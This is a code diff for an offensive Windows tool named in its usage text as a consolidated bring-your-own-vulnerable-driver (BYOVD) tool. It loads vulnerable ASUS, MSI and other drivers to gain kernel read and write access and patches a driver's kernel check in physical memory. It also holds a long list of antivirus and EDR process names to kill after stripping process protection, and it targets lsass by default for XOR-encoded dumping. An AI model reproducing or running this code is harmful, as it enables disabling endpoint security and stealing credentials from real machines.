     "DarktraceTSA.exe",
-    // Deep Instinct
     "DeepInstinct.exe","DeepInstinctService.exe","DIAgentService.exe",
-    // Elastic
     "elastic-endpoint.exe","elastic-agent.exe","a2guard.exe","a2service.exe",
-    // ESET
     "eamonm.exe","eamsi.exe","ecls.exe","efwd.exe","egui.exe","eguiProxy.exe",
     "ekrn.exe","ekrnEpfw.exe","ERAAgent.exe","EraAgentSvc.exe",
-    // Fortinet
     "firesvc.exe","firetray.exe","FortiTray.exe","fortiedr.exe",
-    // Heimdal
     "HeimdalsecurityAgent.exe",
-    // Huntress
     "HuntressAgent.exe","HuntressRMM.exe",
-    // Kaspersky
     "avp.exe","avpsus.exe","avpui.exe","kavfs.exe","kavfsscs.exe","kavfswh.exe",
     "kavfswp.exe","kavtray.exe","klactprx.exe","klcsldcl.exe","klcsweb.exe",
     "klnagent.exe","klnagchk.exe","klscctl.exe","klserver.exe","klwtblfs.exe",
     "kpf4ss.exe","ksde.exe","ksdeui.exe","vapm.exe",
-    // McAfee / Trellix
     "masvc.exe","macmnsvc.exe","McAfeeAgent.exe","mcshield.exe","mfeann.exe",
     "mfevtps.exe","mfetp.exe","mfeepehost.exe","mfefire.exe","mfemactl.exe",
     "mfemacsvc.exe","mfemgr.exe","mfemms.exe","MgntSvc.exe","tepfsvc.exe",
-    // Microsoft Defender
     "MSASCui.exe","MSASCuiL.exe","MpDefenderCoreService.exe","MsMpEng.exe",
     "MsMpSvc.exe","MsSense.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
     "SenseCncProxy.exe","SenseIR.exe","SenseNdr.exe","SenseSampleUploader.exe",
     "smartscreen.exe","windefend.exe","WinDefend.exe",
-    // Morphisec
     "MorphisecService.exe",
-    // Norton / Symantec
     "ccApp.exe","ccSvcHst.exe","ns.exe","nsservice.exe","nortonsecurity.exe",
     "rtvscan.exe","SepMasterService.exe","sepWscSvc64.exe","smc.exe","SmcGui.exe",
-    // OSSEC / Wazuh
     "ossec-agent.exe","wazuh-agent.exe",
-    // Palo Alto / Cortex
     "cortexService.exe","trapsagent.exe","trapsd.exe","Traps.exe",
-    // Qualys
     "qualys-cloud-agent.exe","QualysAgent.exe",
-    // Rapid7
     "ir_agent.exe","rapid7_endpoint.exe",
-    // Red Canary
     "RedCanaryAgent.exe",
-    // Sangfor
     "SangforAgent.exe","SangforEDR.exe","SangforMonitor.exe","SangforProtect.exe","SangforService.exe",
-    // SentinelOne
     "Sentinel.exe","SentinelAgent.exe","SentinelAgentWorker.exe","SentinelCtl.exe",
     "SentinelHelperService.exe","SentinelMemoryScanner.exe","SentinelServiceHost.exe",
     "SentinelStaticEngine.exe","SentinelUI.exe",
-    // SonicWall
     "SonicWallClientProtectionService.exe","swc_service.exe",
-    // Sophos
     "hmpalert.exe","McsAgent.exe","McsClient.exe","SavApi.exe","SAVAdminService.exe",
     "SAVService.exe","SEDService.exe","SophosClean.exe","SophosHealth.exe",
     "SophosLiveQueryService.exe","SophosMTR.exe","SophosNetFilter.exe",
     "SophosNtpService.exe","SophosOsquery.exe","SophosUI.exe","SophosUpdateMgr.exe",
-    // Tanium
     "TaniumClient.exe","TaniumCX.exe","tanclient.exe",
-    // ThreatLocker
     "ThreatLockerConsent.exe","threatlockerservice.exe","threatlockertray.exe",
-    // Trend Micro
     "coreFrameworkHost.exe","coreServiceShell.exe","NTRTScan.exe","ntrtscan.exe",
     "OfcService.exe","PccNTMon.exe","TMBMSRV.exe","TmListen.exe","TmPfw.exe",
-    // Uptycs
     "VectorAgent.exe","UptycsAgent.exe",
-    // WatchGuard
     "wlcsservice.exe",
-    // Webroot
     "WRSA.exe","WRSkyClient.exe","WRSVC.exe",
-    // Sysmon
     "Sysmon.exe","Sysmon64.exe",
-    // Zscaler
     "zlclient.exe",
     nullptr
 };
 
-// Count processes still alive (for verify after kill)
 static int CountRunning(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
@@ -1581,7 +2358,6 @@ static void KillEdrs() {
         printf("[!] %d kill(s) denied - PPL strip likely failed or HVCI active\n", denied);
 }
 
-// Kill specific PID: strip PPL then terminate
 static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
     char nm[16]{};
     QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
@@ -1628,9 +2404,6 @@ static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// Decode (XOR undo)
-// ---------------------------------------------------------------------------
 static bool DecodeFile(const char* inPath, const char* outPath, BYTE xorKey = 0x55) {
     HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
     if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
@@ -1655,9 +2428,6 @@ static bool DecodeFile(const char* inPath, const char* outPath, BYTE xorKey = 0x
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// Jittered sleep: base_ms +/- 40%
-// ---------------------------------------------------------------------------
 static void JitteredSleep(DWORD base_ms) {
     BYTE rnd = 0;
     HCRYPTPROV prov = 0;
@@ -1668,9 +2438,6 @@ static void JitteredSleep(DWORD base_ms) {
     Sleep(base_ms + jitter);
 }
 
-// ---------------------------------------------------------------------------
-// List all processes from EPROCESS chain
-// ---------------------------------------------------------------------------
 static void ListProcs(QWORD sysEproc) {
     printf("%-8s  %-20s  %s\n", "PID", "Name", "Protection");
     printf("%-8s  %-20s  %s\n", "---", "----", "----------");
@@ -1692,9 +2459,6 @@ static void ListProcs(QWORD sysEproc) {
     }
 }
 
-// ---------------------------------------------------------------------------
-// Test R/W
-// ---------------------------------------------------------------------------
 static bool TestRw(QWORD sysEproc) {
     printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
     BYTE block[32]{};
@@ -1714,9 +2478,301 @@ static bool TestRw(QWORD sysEproc) {
     return true;
 }
 
-// ---------------------------------------------------------------------------
-// Driver init
-// ---------------------------------------------------------------------------
+static QWORD FindDriverBaseByServiceName(const std::wstring& svcName) {
+    std::string svcA = WideToUtf8(svcName);
+    LPVOID drvs[1024]; DWORD cb = 0;
+    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
+    int n = cb / sizeof(LPVOID);
+    for (int i = 0; i < n; i++) {
+        char nm[MAX_PATH]{};
+        GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
+        std::string nmStr(nm);
+        auto dot = nmStr.rfind('.');
+        std::string base = (dot != std::string::npos) ? nmStr.substr(0, dot) : nmStr;
+        if (_stricmp(base.c_str(), svcA.c_str()) == 0)
+            return (QWORD)drvs[i];
+    }
+    return 0;
+}
+
+static QWORD FindAsIO3BaseBySignature() {
+    LPVOID drvs[1024]; DWORD cb = 0;
+    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
+    int n = cb / sizeof(LPVOID);
+    for (int i = 0; i < n; i++) {
+        QWORD base = (QWORD)drvs[i];
+        if (!base || base < 0xFFFF000000000000ULL) continue;
+        QWORD va = base + 0x2701;
+        QWORD pa = IocDrv_Va2Pa(va);
+        if (!pa) continue;
+        BYTE sig[6]{};
+        if (!IocDrv_PhysRead(pa, sig, 6)) continue;
+        if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
+            sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
+            char nm[MAX_PATH]{};
+            GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
+            printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
+            return base;
+        }
+    }
+    return 0;
+}
+
+static bool AsIO3_PatchPathCheck(const Config& cfg, const std::wstring& asio3SvcName) {
+    printf("[*] AsIO3 kernel patch: loading secondary driver for physical R/W...\n");
+
+    std::wstring pWide = Utf8ToWide(cfg.patchDrvPath);
+    std::wstring pDropped;
+    if (!CopyDriverToTemp(pWide, pDropped)) return false;
+    std::wstring pSvc = SvcNameFromPath(pDropped);
+    std::wstring pReg = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + pSvc;
+
+    auto pCleanup = [&]() {
+        UnloadDriverViaNt(pReg);
+        DeleteServiceKey(pSvc);
+        JitteredSleep(200);
+        DeleteFileW(pDropped.c_str());
+    };
+
+    if (!CreateDriverService(pSvc, pDropped)) {
+        DeleteFileW(pDropped.c_str());
+        return false;
+    }
+    if (!LoadDriverViaNt(pReg)) {
+        DeleteServiceKey(pSvc);
+        DeleteFileW(pDropped.c_str());
+        return false;
+    }
+    JitteredSleep(400);
+
+    std::wstring devName = L"\\\\.\\iocbios2";
+    if (cfg.patchDrvType == "biostool")     devName = L"\\\\.\\ASUSBIOSIO";
+    else if (cfg.patchDrvType == "asusbiosio") devName = L"\\\\.\\ASUSBIOSIO";
+    else if (cfg.patchDrvType == "ktapi")   devName = L"\\\\.\\ktapi";
+    else if (cfg.patchDrvType == "asmio")   devName = L"\\\\.\\ASMIO";
+
+    HANDLE pDev = CreateFileW(devName.c_str(),
+        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (pDev == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open patch driver device %s (%lu)\n",
+               WideToUtf8(devName).c_str(), GetLastError());
+        pCleanup();
+        return false;
+    }
+    printf("[+] Patch driver device opened\n");
+
+    bool result = false;
+    if (cfg.patchDrvType == "iocdrv" || cfg.patchDrvType.empty()) {
+        HANDLE saveDev = g_iocDev;
+        QWORD  saveCr3 = g_iocCr3;
+        g_iocDev = pDev;
+
+        printf("[*] Bootstrapping CR3 via patch driver (PML4 scan)...\n");
+        g_iocCr3 = IocDrv_FindCr3();
+        if (!g_iocCr3) {
+            printf("[-] CR3 not found via patch driver\n");
+            g_iocDev = saveDev; g_iocCr3 = saveCr3;
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] CR3: 0x%llX\n", g_iocCr3);
+
+        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
+        if (!asio3Base) {
+            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
+            asio3Base = FindAsIO3BaseBySignature();
+        }
+        if (!asio3Base) {
+            printf("[-] Cannot locate AsIO3 kernel base\n");
+            g_iocDev = saveDev; g_iocCr3 = saveCr3;
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+
+        QWORD patchVA = asio3Base + 0x2703;
+        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);
+
+        QWORD patchPA = IocDrv_Va2Pa(patchVA);
+        if (!patchPA) {
+            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
+            g_iocDev = saveDev; g_iocCr3 = saveCr3;
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] Patch site PA: 0x%llX\n", patchPA);
+
+        BYTE orig = 0;
+        IocDrv_PhysRead(patchPA, &orig, 1);
+        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);
+
+        if (orig == 0xEB) {
+            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
+            result = true;
+        } else {
+            BYTE pb = 0xEB;
+            result = IocDrv_PhysWrite(patchPA, &pb, 1);
+            BYTE verify = 0;
+            IocDrv_PhysRead(patchPA, &verify, 1);
+            result = result && (verify == 0xEB);
+            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
+                   result ? "+" : "-", verify);
+        }
+
+        g_iocDev = saveDev;
+        g_iocCr3 = saveCr3;
+    } else if (cfg.patchDrvType == "asmio") {
+        {
+            struct { QWORD pa; DWORD flags; } probes[] = {
+                { 0x100000, 0 },   // 1MB, MmNonCached
+                { 0x100000, 1 },   // 1MB, MmCached
+                { 0x200000, 0 },   // 2MB, MmNonCached
+            };
+            for (auto& p : probes) {
+                QWORD probe = 0; DWORD got = 0;
+                AsmIoReadReq req{ p.pa, 8, p.flags };
+                BOOL ok = DeviceIoControl(pDev, ASMIO_IOCTL_READ,
+                    &req, sizeof(req), &probe, sizeof(probe), &got, nullptr);
+                printf("[*] AsmIo probe PA=0x%llX flags=%lu: ok=%d got=%lu data=0x%016llX err=%lu\n",
+                    p.pa, p.flags, (int)ok, got, probe, ok ? 0 : GetLastError());
+                if (ok && got >= 8) break;  // found working config
+            }
+        }
+        printf("[*] Bootstrapping CR3 via AsmIo (optimized PML4 scan)...\n");
+        QWORD cr3 = AsmIo_FindCr3(pDev);
+        if (!cr3) {
+            printf("[-] CR3 not found via AsmIo\n");
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] CR3: 0x%llX\n", cr3);
+
+        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
+        if (!asio3Base) {
+            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
+            asio3Base = FindAsIO3BaseBySignatureAsmIo(pDev, cr3);
+        }
+        if (!asio3Base) {
+            printf("[-] Cannot locate AsIO3 kernel base\n");
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+
+        QWORD patchVA = asio3Base + 0x2703;
+        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);
+
+        QWORD patchPA = AsmIo_Va2Pa(pDev, cr3, patchVA);
+        if (!patchPA) {
+            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] Patch site PA: 0x%llX\n", patchPA);
+
+        BYTE orig = 0;
+        AsmIo_PhysRead(pDev, patchPA, &orig, 1);
+        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);
+
+        if (orig == 0xEB) {
+            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
+            result = true;
+        } else {
+            result = AsmIo_PhysWrite1(pDev, patchPA, 0xEB);
+            BYTE verify = 0;
+            AsmIo_PhysRead(pDev, patchPA, &verify, 1);
+            result = result && (verify == 0xEB);
+            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
+                   result ? "+" : "-", verify);
+        }
+    } else if (cfg.patchDrvType == "biostool") {
+        HANDLE saveDev = g_biostoolDev;
+        g_biostoolDev = pDev;
+
+        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
+        if (!asio3Base) {
+            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
+            LPVOID drvs2[1024]; DWORD cb2 = 0;
+            if (EnumDeviceDrivers(drvs2, sizeof(drvs2), &cb2)) {
+                int n2 = cb2 / sizeof(LPVOID);
+                for (int i = 0; i < n2 && !asio3Base; i++) {
+                    QWORD base = (QWORD)drvs2[i];
+                    if (!base || base < 0xFFFF000000000000ULL) continue;
+                    PVOID pa2701 = BiosTool_Va2Pa((PVOID)(base + 0x2701));
+                    if (!pa2701) continue;
+                    BYTE sig[6]{};
+                    if (!BiosTool_ReadPhys(pa2701, 6, sig)) continue;
+                    if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
+                        sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
+                        char nm[MAX_PATH]{};
+                        GetDeviceDriverBaseNameA(drvs2[i], nm, sizeof(nm));
+                        printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
+                        asio3Base = base;
+                    }
+                }
+            }
+        }
+        if (!asio3Base) {
+            printf("[-] Cannot locate AsIO3 kernel base\n");
+            g_biostoolDev = saveDev;
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+
+        QWORD patchVA = asio3Base + 0x2703;
+        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);
+
+        PVOID patchPA = BiosTool_Va2Pa((PVOID)patchVA);
+        if (!patchPA) {
+            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
+            g_biostoolDev = saveDev;
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] Patch site PA: 0x%llX\n", (QWORD)patchPA);
+
+        BYTE orig = 0;
+        BiosTool_ReadPhys(patchPA, 1, &orig);
+        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);
+
+        if (orig == 0xEB) {
+            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
+            result = true;
+        } else {
+            BYTE pb = 0xEB;
+            result = BiosTool_WritePhys(patchPA, 1, &pb);
+            BYTE verify = 0;
+            BiosTool_ReadPhys(patchPA, 1, &verify);
+            result = result && (verify == 0xEB);
+            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
+                   result ? "+" : "-", verify);
+        }
+
+        g_biostoolDev = saveDev;
+    } else if (cfg.patchDrvType == "asusbiosio") {
+        printf("[*] ABios probe (reading PA 0x1000)...\n");
+        if (!ABios_Probe(pDev)) {
+            printf("[-] ABios probe failed — IOCTL format mismatch or driver not ready\n");
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        printf("[+] ABios physical read probe OK\n");
+
+        QWORD patchPA = ABios_FindAndPatchAsIO3(pDev, false);
+        if (!patchPA) {
+            printf("[-] AsIO3 signature not found in physical memory scan\n");
+            CloseHandle(pDev); pCleanup();
+            return false;
+        }
+        result = true;
+    } else {
+        printf("[!] patchDrvType '%s' not supported; use iocdrv, biostool, asmio, or asusbiosio\n",
+               cfg.patchDrvType.c_str());
+    }
+
+    CloseHandle(pDev);
+    pCleanup();
+    return result;
+}
+
 static bool InitProvider(const Config& cfg) {
     HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
     g_NtLoadDriver     = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
@@ -1736,13 +2792,12 @@ static bool InitProvider(const Config& cfg) {
     if (cfg.drvPath.empty()) {
         printf("[-] --driver path required\n"); return false;
     }
-    if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
+    if (!EnablePrivilege("SeLoadDriverPrivilege")) {
         printf("[-] SeLoadDriverPrivilege not available\n"); return false;
     }
 
     std::wstring widePath = Utf8ToWide(cfg.drvPath);
 
-    // Hash-verify BEFORE dropping to temp (fail early)
     if (!VerifyDriverHash(widePath, cfg.type, cfg.forceUnsafe)) {
         printf("[-] Driver hash verification failed. Aborting.\n");
         return false;
@@ -1758,6 +2813,7 @@ static bool InitProvider(const Config& cfg) {
     g_dropPath = dropped;
 
     if (!CreateDriverService(g_svcName, dropped)) return false;
+
     if (!LoadDriverViaNt(g_regPath)) {
         DeleteServiceKey(g_svcName);
         DeleteFileW(dropped.c_str());
@@ -1781,17 +2837,179 @@ static bool InitProvider(const Config& cfg) {
         return true;
     }
 
-    // BiosTool
+    if (cfg.type == ProviderType::IocDrv) {
+        if (EnablePrivilege("SeDebugPrivilege"))
+            printf("[+] SeDebugPrivilege enabled\n");
+        else
+            printf("[!] SeDebugPrivilege NOT enabled (err=%lu)\n", GetLastError());
+        if (EnablePrivilege("SeSecurityPrivilege"))  // iocdrv also checks privilege 22
+            printf("[+] SeSecurityPrivilege enabled\n");
+        else
+            printf("[!] SeSecurityPrivilege NOT enabled (err=%lu)\n", GetLastError());
+        g_iocDev = CreateFileW(L"\\\\.\\iocbios2",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_iocDev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open \\\\.\\iocbios2 (%lu)\n", GetLastError()); return false;
+        }
+        printf("[+] iocbios2 device opened\n");
+        {
+            BYTE probe[12] = {0};  // driver requires OutputBufferLength >= 12
+            BOOL ok = FALSE;
+            DWORD got = 0;
+            IocReadReq req{ 0x1000, 4 };
+            ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_READ,
+                &req, sizeof(req), probe, sizeof(probe), &got, nullptr);
+            printf("[*] IOCTL probe PA=0x1000: ok=%d got=%lu data=0x%X err=%lu\n",
+                (int)ok, got, *(DWORD*)probe, GetLastError());
+        }
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
+        g_iocCr3 = IocDrv_FindCr3();
+        if (!g_iocCr3) {
+            printf("[-] CR3 bootstrap failed - iocdrv VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_iocCr3);
+        return true;
+    }
+
+    if (cfg.type == ProviderType::AsIO3) {
+        std::wstring asio3SvcName = g_svcName;
+        Asio3_CreateSwwlEvent();
+        g_asio3Dev = CreateFileW(L"\\\\.\\Asusgio3",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_asio3Dev == INVALID_HANDLE_VALUE) {
+            g_asio3Dev = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Asusgio3",
+                GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        }
+
+        if (g_asio3Dev == INVALID_HANDLE_VALUE && !cfg.patchDrvPath.empty()
+            && GetLastError() == ERROR_ACCESS_DENIED) {
+            printf("[*] Asusgio3 IRP_MJ_CREATE blocked (path/signature check). "
+                   "Attempting kernel patch via secondary driver...\n");
+            if (AsIO3_PatchPathCheck(cfg, asio3SvcName)) {
+                printf("[*] Patch applied — retrying device open...\n");
+                JitteredSleep(50);
+                g_asio3Dev = CreateFileW(L"\\\\.\\Asusgio3",
+                    GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+                if (g_asio3Dev == INVALID_HANDLE_VALUE) {
+                    g_asio3Dev = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Asusgio3",
+                        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+                }
+            }
+        }
+
+        if (g_asio3Dev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open Asusgio3 device (%lu)\n", GetLastError());
+            printf("    Hint: run from %%PROGRAMFILES(X86)%%\\ASUS\\AsusCertService\\\n");
+            printf("    Hint: --patch-driver <drv.sys> --patch-driver-type asusbiosio to bypass\n");
+            return false;
+        }
+        printf("[+] Asusgio3 device opened\n");
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
+        g_asio3Cr3 = Asio3_FindCr3();
+        if (!g_asio3Cr3) {
+            printf("[-] CR3 bootstrap failed - asio3 VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_asio3Cr3);
+        return true;
+    }
+
+    if (cfg.type == ProviderType::NTIOLib) {
+        g_ntiolibDev = CreateFileW(L"\\\\.\\NTIOLib_MysticLight",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_ntiolibDev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open NTIOLib_MysticLight (%lu)\n", GetLastError());
+            return false;
+        }
+        printf("[+] NTIOLib_MysticLight device opened\n");
+        if (!NTIOLib_Auth()) {
+            printf("[-] NTIOLib auth IOCTL failed (%lu)\n", GetLastError());
+            return false;
+        }
+        printf("[+] NTIOLib authenticated (magic 0x%X)\n", NTIOLIB_AUTH_MAGIC);
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
+        g_ntiolibCr3 = NTIOLib_FindCr3();
+        if (!g_ntiolibCr3) {
+            printf("[-] CR3 bootstrap failed - ntiolib VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_ntiolibCr3);
+        return true;
+    }
+
+    if (cfg.type == ProviderType::RtsPpx) {
+        g_rtsPpxDev = CreateFileW(L"\\\\.\\RtsPpx",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_rtsPpxDev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open \\\\.\\RtsPpx (%lu)\n", GetLastError());
+            return false;
+        }
+        printf("[+] RtsPpx device opened (handle=0x%p)\n", g_rtsPpxDev);
+
+        // Probe: try reading BIOS ROM at 0xF0000 (always mapped, should be safe)
+        printf("[*] Probing phys read at BIOS ROM 0xF0000...\n");
+        BYTE probe[8]{};
+        if (!RtsPpx_PhysRead(0xF0000, probe, 8)) {
+            printf("[-] Probe failed - driver may not work\n");
+            // Try a higher address that might be valid
+            printf("[*] Trying physical 0xFED00000 (HPET region)...\n");
+            if (!RtsPpx_PhysRead(0xFED00000, probe, 8)) {
+                printf("[-] Second probe also failed\n");
+                return false;
+            }
+        }
+        printf("[+] Probe OK: %02X %02X %02X %02X %02X %02X %02X %02X\n",
+            probe[0], probe[1], probe[2], probe[3], probe[4], probe[5], probe[6], probe[7]);
+
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
+        g_rtsPpxCr3 = RtsPpx_FindCr3();
+        if (!g_rtsPpxCr3) {
+            printf("[-] CR3 bootstrap failed - RtsPpx VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_rtsPpxCr3);
+        return true;
+    }
+
+    if (cfg.type == ProviderType::RwDrv) {
+        g_rwDrvDev = CreateFileW(L"\\\\.\\fmem3",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_rwDrvDev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open \\\\.\\fmem3 (%lu)\n", GetLastError());
+            return false;
+        }
+        printf("[+] RwDrv device opened (handle=0x%p)\n", g_rwDrvDev);
+
+        printf("[*] Probing phys read at 0x1000...\n");
+        BYTE probe[8]{};
+        if (!RwDrv_PhysRead(0x1000, probe, 8)) {
+            printf("[-] Probe failed - driver may not work\n");
+            return false;
+        }
+        printf("[+] Probe OK: %02X %02X %02X %02X %02X %02X %02X %02X\n",
+            probe[0], probe[1], probe[2], probe[3], probe[4], probe[5], probe[6], probe[7]);
+
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan...\n");
+        g_rwDrvCr3 = RwDrv_FindCr3();
+        if (!g_rwDrvCr3) {
+            printf("[-] CR3 bootstrap failed - RwDrv VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_rwDrvCr3);
+        return true;
+    }
+
     std::wstring devPath = L"\\\\.\\" + g_svcName;
     g_biostoolDev = CreateFileW(devPath.c_str(),
         GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (g_biostoolDev == INVALID_HANDLE_VALUE) {
-        g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
+        devPath = L"\\\\.\\BiosToolCommonDriver";
+        g_biostoolDev = CreateFileW(devPath.c_str(),
             GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     }
     if (g_biostoolDev == INVALID_HANDLE_VALUE) {
-        printf("[-] Cannot open device %s (%lu)\n",
-            WideToUtf8(devPath).c_str(), GetLastError());
+        devPath = L"\\\\.\\ASUSBIOSIO";
+        g_biostoolDev = CreateFileW(devPath.c_str(),
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+    }
+    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open device (tried svc, BiosToolCommonDriver, ASUSBIOSIO) (%lu)\n", GetLastError());
         return false;
     }
     printf("[+] Device opened: %s\n", WideToUtf8(devPath).c_str());
@@ -1802,19 +3020,22 @@ static void CleanupProvider() {
     if (g_biostoolDev != INVALID_HANDLE_VALUE) { CloseHandle(g_biostoolDev); g_biostoolDev = INVALID_HANDLE_VALUE; }
     if (g_pdfwDev     != INVALID_HANDLE_VALUE) { CloseHandle(g_pdfwDev);     g_pdfwDev     = INVALID_HANDLE_VALUE; }
     if (g_ktapiDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_ktapiDev);    g_ktapiDev    = INVALID_HANDLE_VALUE; }
+    if (g_iocDev      != INVALID_HANDLE_VALUE) { CloseHandle(g_iocDev);      g_iocDev      = INVALID_HANDLE_VALUE; }
+    if (g_asio3Dev    != INVALID_HANDLE_VALUE) { CloseHandle(g_asio3Dev);    g_asio3Dev    = INVALID_HANDLE_VALUE; }
+    if (g_ntiolibDev  != INVALID_HANDLE_VALUE) { CloseHandle(g_ntiolibDev);  g_ntiolibDev  = INVALID_HANDLE_VALUE; }
+    if (g_rtsPpxDev   != INVALID_HANDLE_VALUE) { CloseHandle(g_rtsPpxDev);   g_rtsPpxDev   = INVALID_HANDLE_VALUE; }
+    if (g_rwDrvDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_rwDrvDev);    g_rwDrvDev    = INVALID_HANDLE_VALUE; }
+    if (g_swwlEvent) { CloseHandle(g_swwlEvent); g_swwlEvent = nullptr; }
     if (!g_regPath.empty()) { UnloadDriverViaNt(g_regPath); DeleteServiceKey(g_svcName); }
     if (!g_dropPath.empty()) { JitteredSleep(500); DeleteFileW(g_dropPath.c_str()); }
 }
 
-// ---------------------------------------------------------------------------
-// CLI
-// ---------------------------------------------------------------------------
 static void Usage(const char* prog) {
     printf(
         "cascade - consolidated BYOVD tool (BiosToolCommonDriver / ktapi / warp)\n\n"
         "usage: %s [options]\n"
         "  --driver PATH          path to vulnerable driver .sys\n"
-        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl\n"
+        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl, iocdrv, asio3, ntiolib, rtsppx\n"
         "  --pid N                target PID (default: lsass)\n\n"
         "Pre-flight checks:\n"
         "  --check-security       detect VBS/HVCI/Credential Guard and exit\n"
@@ -1841,6 +3062,9 @@ static void Usage(const char* prog) {
         "  --no-xor               raw output (with --dump)\n"
